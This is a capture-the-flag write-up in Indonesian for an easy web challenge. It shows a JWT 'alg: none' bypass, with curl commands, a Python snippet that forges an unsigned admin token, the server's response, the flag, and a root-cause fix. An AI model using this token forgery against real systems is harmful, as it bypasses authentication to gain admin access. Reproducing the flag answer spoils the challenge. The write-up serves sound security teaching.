# Discord Nitro

**CTF:** LYKNCTF 2026  
**Category:** Web  
**Difficulty:** Easy  
**Flag:** `LYKNCTF{4bc029f8d7f3494ca627f5985bc7de63}`

## Deskripsi

> Free Discord Nitro

Target menyediakan akun demo `guest / guest`. Setelah login, aplikasi menyimpan identitas pengguna dalam cookie `token` berbentuk JWT. Halaman `/admin` hanya memeriksa nilai `role` dari token tersebut.

## Recon

Halaman awal menampilkan kredensial demo:

```text
guest / guest
```

Login dilakukan dengan `POST /login`:

```bash
BASE='http://385b1902-ea55-4d1b-8b75-dabbaddc58b1.51.79.140.18.nip.io:8080'

curl -sS -c cookies.txt -o /dev/null \
  -X POST "$BASE/login" \
  -d 'username=guest&password=guest'
```

Cookie hasil login berisi JWT:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.
dCdGtxl1AM3Uk65cK67xMPkvOdoCmYZ2YAXd4-SykTs
```

Header dan payload setelah di-decode:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

```json
{
  "user": "guest",
  "role": "user"
}
```

Halaman `/admin` menampilkan petunjuk bahwa cookie `token` menentukan identitas pengguna. Tidak ada validasi tambahan terhadap akun di sisi server.

## Vulnerability

JWT parser menerima token dengan algoritma `none`. Algoritma tersebut menyatakan bahwa token tidak memiliki signature.

Karena server tetap mempercayai payload token tanpa signature, nilai berikut dapat dibuat secara manual:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

```json
{
  "user": "admin",
  "role": "admin"
}
```

JWT akhirnya berbentuk:

```text
base64url(header).base64url(payload).
```

Titik terakhir wajib ada sebagai bagian signature kosong.

## Exploit

Token admin dibuat menggunakan Python lalu dikirim sebagai cookie ke `/admin`:

```bash
BASE='http://385b1902-ea55-4d1b-8b75-dabbaddc58b1.51.79.140.18.nip.io:8080'

TOKEN=$(python3 -c '
import json
import base64

encode = lambda value: base64.urlsafe_b64encode(
    json.dumps(value, separators=(",", ":")).encode()
).decode().rstrip("=")

print(
    encode({"alg": "none", "typ": "JWT"})
    + "."
    + encode({"user": "admin", "role": "admin"})
    + "."
)
')

curl -sS "$BASE/admin" -H "Cookie: token=$TOKEN"
```

Server menerima token tanpa signature dan memberikan akses admin:

```html
<p class="ok">Welcome, administrator! Here is your reward:</p>
<pre class="flag">LYKNCTF{4bc029f8d7f3494ca627f5985bc7de63}</pre>
```

## Root Cause

Backend mengizinkan algoritma JWT ditentukan oleh header token dan menerima `alg: none`. Server seharusnya menetapkan algoritma yang diperbolehkan secara eksplisit, misalnya hanya `HS256`, lalu selalu memverifikasi signature sebelum membaca claim `role`.

## Flag

```text
LYKNCTF{4bc029f8d7f3494ca627f5985bc7de63}
```
